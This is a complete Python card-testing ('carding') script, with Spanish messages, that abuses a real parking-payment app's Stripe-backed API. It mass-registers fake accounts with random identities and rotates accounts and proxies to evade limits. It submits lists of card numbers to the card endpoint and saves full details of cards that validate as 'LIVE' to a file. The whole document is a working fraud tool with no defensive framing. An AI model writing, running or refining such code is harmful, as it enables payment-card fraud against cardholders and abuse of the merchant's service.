import asyncio
import json
import os
import random
import re
import string
import sys
from datetime import datetime

for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

if os.name == "nt":
    os.system("")

from primp import AsyncClient

# ══════════════════════════════════════
# CONFIG (standalone — edit here)
# ══════════════════════════════════════
BASE = "https://parkingpay-api-prod.azurewebsites.net"

CARDS_PER_ACCOUNT = 20          # cards per account before rotating
BATCH_SIZE        = 5           # concurrent workers running in parallel
GLOBAL_PROXY      = ""          # e.g. "http://user:pass@host:port" or ""
PROXY_FILE        = ""          # e.g. "proxies.txt" (host:port:user:pass per line)
GLOBAL_TIMEOUT    = 20          # seconds
GLOBAL_RETRIES    = 2           # hard retries (network errors get +2)
REQUEST_DELAY     = 0.3         # seconds between cards within a worker
BATCH_DELAY       = 0.5         # seconds between spawning workers
ACCOUNT_RETRY_MAX = 5           # max attempts to create an account before giving up
ACCOUNT_RETRY_DLY = 2.0         # base delay between account-creation retries

LIVE_OUTPUT_FILE  = "live.txt"  # live cards are appended here immediately
NOTE_FILE         = "note.txt"  # optional note printed at start (if exists)

COMMON_HEADERS = {
    "user-agent": "Dart/2.18 (dart:io)",
    "content-type": "application/json; charset=utf-8",
    "accept-encoding": "gzip",
    "host": "parkingpay-api-prod.azurewebsites.net",
}

# ══════════════════════════════════════
# COLORS
# ══════════════════════════════════════
class C:
    RESET = "\033[0m"
    BOLD  = "\033[1m"
    DIM   = "\033[2m"
    RED   = "\033[91m"
    GREEN = "\033[92m"
    YELLOW= "\033[93m"
    BLUE  = "\033[94m"
    CYAN  = "\033[96m"
    GRAY  = "\033[90m"


def _colorize(text: str, color: str) -> str:
    return f"{color}{text}{C.RESET}"


# ══════════════════════════════════════
# HELPERS
# ══════════════════════════════════════
def _random_identity() -> dict:
    first = "".join(random.choices(string.ascii_lowercase, k=6)).title()
    last  = "".join(random.choices(string.ascii_lowercase, k=7)).title()
    return {
        "first_name": first,
        "last_name": last,
        "email": f"{first.lower()}{last.lower()}{random.randint(100000, 999999)}@gmail.com",
        "phone": str(random.randint(1000000000, 9999999999)),
        "password": f"{first.lower()}{last.lower()}{random.randint(1000, 9999)}.",
    }


def _gate_off(response) -> bool:
    return (
        response.status_code == 403
        or "web app is stopped" in response.text.lower()
        or "Web App - Unavailable" in response.text
    )


def _is_network_error(exc: Exception) -> bool:
    """True if exception is a network/transport error worth retrying."""
    name = type(exc).__name__
    return name in (
        "TimeoutError", "RequestError", "ConnectError", "ReadError",
        "WriteError", "ConnectionError", "NetworkError", "ProtocolError",
        "TransportError", "ConnectTimeout", "ReadTimeout", "WriteTimeout",
        "PoolTimeout",
    )


def parse_cc(raw: str) -> dict:
    parts = re.split(r"[|/\s]+", raw.strip())
    parts = [p for p in parts if p]
    if len(parts) < 4:
        raise ValueError(f"Formato inválido: '{raw}'. Usa tarjeta|mes|año|cvv")
    number, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    number = re.sub(r"\D", "", number)
    if not (13 <= len(number) <= 19):
        raise ValueError(f"PAN inválido: {number}")
    mm = mm.zfill(2)
    if not (1 <= int(mm) <= 12):
        raise ValueError(f"Mes inválido: {mm}")
    if len(yy) == 2:
        yy = "20" + yy
    if not (4 <= len(yy) == 4):
        raise ValueError(f"Año inválido: {yy}")
    if not (3 <= len(cvv) <= 4):
        raise ValueError(f"CVV inválido: {cvv}")
    return {"number": number, "exp_month": mm, "exp_year": yy, "cvv": cvv}


def mask_card(number: str) -> str:
    if len(number) < 10:
        return number
    return f"{number[:6]}{'*' * (len(number) - 10)}{number[-4:]}"


def full_card_str(card: dict) -> str:
    return f"{card['number']}|{card['exp_month']}|{card['exp_year']}|{card['cvv']}"


# ══════════════════════════════════════
# LIVE OUTPUT (immediate save)
# ══════════════════════════════════════
_LIVE_FILE_LOCK = asyncio.Lock()


async def _save_live(line: str):
    async with _LIVE_FILE_LOCK:
        try:
            with open(LIVE_OUTPUT_FILE, "a", encoding="utf-8") as f:
                f.write(line + "\n")
                f.flush()
                os.fsync(f.fileno())
        except Exception as e:
            print(_colorize(f"⚠️  No se pudo guardar live: {e}", C.YELLOW))


# ══════════════════════════════════════
# PROXY MANAGEMENT
# ══════════════════════════════════════
_PROXY_LIST: list = []
_PROXY_IDX: int = 0
_PROXY_LOCK = asyncio.Lock()


def parse_proxy_line(raw: str):
    line = raw.strip()
    if not line or line.startswith("#"):
        return None
    if "://" in line:
        return line
    parts = line.split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    if len(parts) == 2:
        host, port = parts
        return f"http://{host}:{port}"
    return None


def load_proxies(path: str) -> list:
    if not path or not os.path.exists(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        for line in f:
            url = parse_proxy_line(line)
            if url:
                out.append(url)
    return out


async def _next_proxy():
    global _PROXY_IDX
    async with _PROXY_LOCK:
        if _PROXY_LIST:
            proxy = _PROXY_LIST[_PROXY_IDX % len(_PROXY_LIST)]
            _PROXY_IDX += 1
            return proxy
        return (GLOBAL_PROXY or "").strip() or None


# ══════════════════════════════════════
# ACCOUNT CREATION
# ══════════════════════════════════════
async def _create_account() -> dict:
    """
    Creates one account+token. Retries on network errors internally.
    Raises ValueError for logical failures (gate off, bad response).
    """
    last_exc: Exception = None

    for attempt in range(1, ACCOUNT_RETRY_MAX + 1):
        proxy_url = await _next_proxy()
        identity = _random_identity()
        client = AsyncClient(
            proxy=proxy_url,
            timeout=GLOBAL_TIMEOUT,
            verify=not bool(proxy_url),
        )

        try:
            # 1. Registro
            r = await client.post(
                f"{BASE}/api/app/usuarios/registro",
                json={
                    "correoElectronico": identity["email"],
                    "nombre": identity["first_name"],
                    "apellidos": identity["last_name"],
                    "telefono": identity["phone"],
                    "contrasena": identity["password"],
                },
                headers=COMMON_HEADERS,
            )
            if _gate_off(r):
                raise ValueError("Gate off - activo en horario laboral MX")
            if r.status_code != 200:
                raise ValueError(f"Registro failed ({r.status_code}): {r.text[:100]}")

            # 2. Login
            r = await client.post(
                f"{BASE}/api/auth",
                json={
                    "correoElectronico": identity["email"],
                    "contrasena": identity["password"],
                },
                headers=COMMON_HEADERS,
            )
            if _gate_off(r):
                raise ValueError("Gate off - activo en horario laboral MX")
            if r.status_code != 200:
                raise ValueError(f"Login failed ({r.status_code}): {r.text[:100]}")

            try:
                auth = r.json()
            except Exception:
                auth = None
            if not auth or not auth.get("token"):
                raise ValueError("Login OK pero sin token")

            return {
                "client": client,
                "token": auth["token"],
                "email": identity["email"],
                "used": 0,
            }

        except ValueError:
            # Logical error — propagate immediately (gate off is fatal)
            raise
        except Exception as e:
            # Network/transport error — retry with backoff
            last_exc = e
            if attempt < ACCOUNT_RETRY_MAX:
                delay = ACCOUNT_RETRY_DLY * attempt + random.random()
                print(_colorize(
                    f"    🔄 Reintento cuenta {attempt}/{ACCOUNT_RETRY_MAX} "
                    f"tras {type(e).__name__} — esperando {delay:.1f}s",
                    C.YELLOW
                ))
                await asyncio.sleep(delay)
                continue
            # Out of retries
            raise ValueError(
                f"Network error tras {ACCOUNT_RETRY_MAX} intentos: "
                f"{type(e).__name__}: {str(e)[:80]}"
            ) from last_exc

    # Shouldn't reach here
    raise ValueError(f"Account creation failed: {last_exc}")


# ══════════════════════════════════════
# ADD CARD
# ══════════════════════════════════════
async def _add_card(st: dict, card: dict) -> dict:
    headers = COMMON_HEADERS.copy()
    headers["authorization"] = st["token"]

    try:
        r = await st["client"].post(
            f"{BASE}/api/app/conductor/tarjetas",
            json={
                "numero": card["number"],
                "expiracionMes": card["exp_month"],
                "expiracionYear": card["exp_year"],
            },
            headers=headers,
        )
    except Exception as e:
        return {"status": "ERROR", "message": f"Red: {type(e).__name__}: {str(e)[:80]}"}

    body = r.text

    if _gate_off(r):
        return {"status": "ERROR", "message": "Gate off - activo en horario laboral MX"}
    if r.status_code == 401 or "no autorizado" in body.lower():
        return {"status": "ERROR", "message": "Token de la cuenta expirado"}
    if r.status_code in (429, 503) or (r.status_code == 500 and not body.strip()):
        return {"status": "ERROR", "message": "Endpoint saturado"}

    if "fingerprint" in body:
        return {"status": "LIVE", "message": "Charge $1 MXN Approved"}

    if "error al crear la tarjeta en stripe" in body.lower():
        try:
            j = r.json()
        except Exception:
            j = None
        msg = ""
        if isinstance(j, dict):
            msg = j.get("message", "") or j.get("error", "") or ""
        return {"status": "DEAD", "message": (msg[:120] if msg else "Declined by Stripe")}

    try:
        j = r.json()
    except Exception:
        j = None
    if isinstance(j, dict):
        msg = j.get("message", "") or j.get("error", "") or str(j)[:120]
        return {"status": "DEAD", "message": msg}

    return {"status": "DEAD", "message": f"Unknown: {body[:120]}"}


# ══════════════════════════════════════
# CHECK ONE CARD
# ══════════════════════════════════════
async def _check_one_with_state(st: dict, raw_line: str) -> dict:
    try:
        card = parse_cc(raw_line)
    except ValueError as e:
        return {"status": "error", "message": str(e),
                "masked": _fmt_ccn(raw_line), "full": raw_line.strip()}

    masked = mask_card(card["number"])
    full   = full_card_str(card)

    hard_budget = max(1, GLOBAL_RETRIES)
    net_budget  = hard_budget + 2
    hard = net = 0
    last_msg = "Unknown error"

    while hard < hard_budget and net < net_budget:
        result = await _add_card(st, card)
        if result["status"] != "ERROR":
            st["used"] = st.get("used", 0) + 1
            status_map = {"LIVE": "success", "DEAD": "declined", "ERROR": "error"}
            return {
                "status": status_map.get(result["status"], "error"),
                "message": result.get("message", ""),
                "masked": masked,
                "full": full,
            }

        last_msg = result.get("message", last_msg)
        if last_msg.startswith("Gate off"):
            return {"status": "error", "message": last_msg,
                    "masked": masked, "full": full}

        if last_msg.startswith("Endpoint saturado") or last_msg.startswith("Red:"):
            net += 1
            await asyncio.sleep(1.0 + random.random())
            continue

        if last_msg.startswith("Token de la cuenta expirado"):
            return {"status": "error", "message": last_msg,
                    "masked": masked, "full": full,
                    "need_new_account": True}

        hard += 1

    return {"status": "error", "message": last_msg, "masked": masked, "full": full}


# ══════════════════════════════════════
# WORKER (per-slot: rotates account every CARDS_PER_ACCOUNT cards)
# ══════════════════════════════════════
async def _worker(worker_id: int, cards: list, results: list, print_lock: asyncio.Lock):
    async with print_lock:
        print(_colorize(f"\n🚀 [Worker #{worker_id}] Iniciando — {len(cards)} tarjeta(s)", C.CYAN))

    st = None
    used_in_current_account = 0
    account_num = 0

    local_live = local_dead = local_err = 0
    gate_off_hit = False

    for idx, line in enumerate(cards, 1):
        # ── Rotate account when budget exhausted or forced ──
        need_fresh = (st is None) or (used_in_current_account >= CARDS_PER_ACCOUNT)

        if need_fresh:
            try:
                st = await _create_account()
                used_in_current_account = 0
                account_num += 1
                async with print_lock:
                    print(_colorize(
                        f"    [{C.DIM}W#{worker_id} · acc#{account_num}{C.RESET}] "
                        f"Cuenta: {st['email']}",
                        C.GRAY
                    ))
            except ValueError as e:
                msg = str(e)
                if msg.startswith("Gate off"):
                    gate_off_hit = True
                    async with print_lock:
                        print(_colorize(f"⚠️  [W#{worker_id}] Gate off — abortando", C.YELLOW))
                else:
                    async with print_lock:
                        print(_colorize(
                            f"⚠️  [W#{worker_id}] No se pudo crear cuenta: {msg}", C.YELLOW
                        ))

                # Mark current card as error and continue to next
                results.append({
                    "card": _fmt_ccn(line),
                    "full": line.strip(),
                    "status": "error",
                    "message": msg,
                })
                local_err += 1
                async with print_lock:
                    print(_colorize(
                        f"[W{worker_id} {idx:>3}/{len(cards)}] ⚠️ ERROR | {line.strip()} | {msg}",
                        C.YELLOW
                    ))

                if gate_off_hit:
                    # Stop the whole worker — remaining cards can't succeed
                    remaining = len(cards) - idx
                    if remaining > 0:
                        for rest_line in cards[idx:]:
                            results.append({
                                "card": _fmt_ccn(rest_line),
                                "full": rest_line.strip(),
                                "status": "error",
                                "message": "Gate off (worker abort)",
                            })
                        local_err += remaining
                    break
                continue

        # ── Check card ──
        try:
            result = await _check_one_with_state(st, line)
        except Exception as e:
            result = {
                "status": "error",
                "message": f"{type(e).__name__}: {str(e)[:120]}",
                "masked": _fmt_ccn(line),
                "full": line.strip(),
            }

        used_in_current_account += 1

        status = result["status"]
        msg = (result.get("message") or "").strip()[:140]
        masked = result.get("masked") or _fmt_ccn(line)
        full   = result.get("full") or line.strip()

        if status == "success":
            local_live += 1
            tag = _colorize("✅ LIVE ", C.GREEN + C.BOLD)
            card_line = _colorize(full, C.GREEN)
        elif status == "declined":
            local_dead += 1
            tag = _colorize("❌ DEAD ", C.RED + C.BOLD)
            card_line = _colorize(full, C.RED)
        else:
            local_err += 1
            tag = _colorize("⚠️ ERROR", C.YELLOW + C.BOLD)
            card_line = _colorize(full, C.YELLOW)

        async with print_lock:
            print(
                f"[W{worker_id} {idx:>3}/{len(cards)}] {tag} | {card_line} | "
                f"{_colorize(msg, C.DIM)}"
            )

        results.append({"card": masked, "full": full, "status": status, "message": msg})

        # ── Immediate save for LIVE ──
        if status == "success":
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            await _save_live(f"{full}  # {msg}  [{ts}]  worker#{worker_id}")

        # ── Token expired → force account rotation for next card ──
        if result.get("need_new_account"):
            used_in_current_account = CARDS_PER_ACCOUNT

        if REQUEST_DELAY and idx < len(cards):
            await asyncio.sleep(REQUEST_DELAY)

    async with print_lock:
        print(_colorize(
            f"🏁 [Worker #{worker_id}] Fin — ✅ {local_live}  ❌ {local_dead}  ⚠️ {local_err}",
            C.CYAN
        ))


# ══════════════════════════════════════
# CLI
# ══════════════════════════════════════
CCN_RE = re.compile(r"(\d{6})\d+(\d{4})")

def _fmt_ccn(line: str, fallback: str = "") -> str:
    m = CCN_RE.search(line)
    if m:
        return f"{m.group(1)}******{m.group(2)}"
    return fallback or line


def _load_cards(path: str) -> list:
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        lines = f.readlines()
    out = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        out.append(line)
    return out


async def _run_file(cards: list) -> dict:
    results: list = []
    print_lock = asyncio.Lock()

    total = len(cards)
    num_workers = min(BATCH_SIZE, total)

    worker_inputs = [[] for _ in range(num_workers)]
    for i, c in enumerate(cards):
        worker_inputs[i % num_workers].append(c)

    print(_colorize(
        f"⚙️  Config: {total} tarjeta(s) → {num_workers} worker(s) paralelo(s)", C.BLUE
    ))
    print(_colorize(
        f"   Cada worker rota a nueva cuenta cada {CARDS_PER_ACCOUNT} tarjetas",
        C.GRAY
    ))
    print()

    workers = []
    for wid, chunk in enumerate(worker_inputs, 1):
        workers.append(asyncio.create_task(_worker(wid, chunk, results, print_lock)))
        await asyncio.sleep(BATCH_DELAY)

    await asyncio.gather(*workers, return_exceptions=True)

    live = sum(1 for r in results if r["status"] == "success")
    dead = sum(1 for r in results if r["status"] == "declined")
    err  = sum(1 for r in results if r["status"] == "error")

    print("\n" + _colorize("═" * 72, C.CYAN))
    print(_colorize(
        f"📊 RESUMEN  |  Total: {total}  |  "
        f"{C.GREEN}✅ {live}{C.RESET}  {C.RED}❌ {dead}{C.RESET}  {C.YELLOW}⚠️ {err}{C.RESET}",
        C.BOLD
    ))
    print(_colorize("═" * 72, C.CYAN))
    if live > 0:
        print(_colorize(f"💾 Live cards guardadas en: {LIVE_OUTPUT_FILE}", C.GREEN))

    return {"total": total, "live": live, "dead": dead, "error": err, "results": results}


if __name__ == "__main__":
    script_dir = os.path.dirname(os.path.abspath(__file__))
    default_card_path = os.path.join(script_dir, "card.txt")
    default_proxy_path = os.path.join(script_dir, "proxy.txt")

    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    card_file = args[0] if len(args) > 0 else default_card_path
    proxy_file = args[1] if len(args) > 1 else (PROXY_FILE or default_proxy_path)

    note_path = os.path.join(script_dir, NOTE_FILE)
    if os.path.exists(note_path):
        try:
            with open(note_path, "r", encoding="utf-8", errors="replace") as f:
                note = f.read().strip()
            if note:
                print(_colorize("📝 NOTE:", C.CYAN + C.BOLD))
                print(_colorize(note, C.GRAY))
                print()
        except Exception:
            pass

    _PROXY_LIST = load_proxies(proxy_file)
    if _PROXY_LIST:
        print(_colorize(f"🌐 Cargados {len(_PROXY_LIST)} proxy(ies) desde {proxy_file}", C.GREEN))
    elif os.path.exists(proxy_file):
        print(_colorize(f"⚠️  Archivo de proxy vacío o inválido: {proxy_file}", C.YELLOW))
    else:
        print(_colorize(f"ℹ️  Sin archivo de proxy ({proxy_file}) — usando GLOBAL_PROXY/directo", C.GRAY))

    if not os.path.exists(card_file):
        print(_colorize(f"❌ No se encontró el archivo: {card_file}", C.RED))
        print("Uso: python gate_stripe_park.py [card.txt] [proxy.txt]")
        sys.exit(1)

    try:
        cards = _load_cards(card_file)
    except Exception as e:
        print(_colorize(f"❌ Error leyendo {card_file}: {type(e).__name__}: {e}", C.RED))
        sys.exit(1)

    if not cards:
        print(_colorize(f"❌ Sin tarjetas válidas en {card_file}", C.RED))
        sys.exit(1)

    print(_colorize(f"📂 Cargadas {len(cards)} tarjeta(s) desde {card_file}", C.BLUE))

    summary = asyncio.run(_run_file(cards))

    if os.environ.get("PARKINGPAY_JSON") == "1":
        print(json.dumps({k: v for k, v in summary.items() if k != "results"},
                         ensure_ascii=False, indent=2))

    sys.exit(0 if summary["live"] > 0 else 1)